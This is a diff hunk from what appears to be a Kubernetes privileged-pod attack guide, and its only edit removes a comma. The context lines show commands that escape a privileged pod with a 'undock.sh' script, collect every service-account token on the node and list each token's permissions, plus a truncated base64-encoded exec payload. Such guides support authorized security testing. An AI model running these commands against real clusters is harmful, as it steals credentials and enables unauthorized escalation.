@@ -369,7 +369,7 @@ kubectl exec -it priv-exec-pod -- bash -c "echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9m
 
 **Run kubectl can-i --list against ALL tokens found on the node**
 
-*Run this where you have kubectl installed, and NOT from within the priv pod.*
+*Run this where you have kubectl installed and NOT from within the priv pod.*
 *Make sure you already dropped undock.sh to the pod* 
 ```
 tokens=`kubectl exec -it priv-exec-pod -- sh undock.sh """find /var/lib/kubelet/pods/ -name token -type l"""`; \
@@ -396,7 +396,7 @@ The next command will do the same thing, but just in the kube-system namespace.
 
 **Run kubectl can-i --list -n kube-system against ALL tokens found on the node**
 
-*Run this where you have kubectl installed, and NOT from within the priv pod.*
+*Run this where you have kubectl installed and NOT from within the priv pod.*
 *Make sure you already dropped undock.sh to the pod* 
 ```
 tokens=`kubectl exec -it priv-exec-pod -- sh undock.sh """find /var/lib/kubelet/pods/ -name token -type l"""`; \
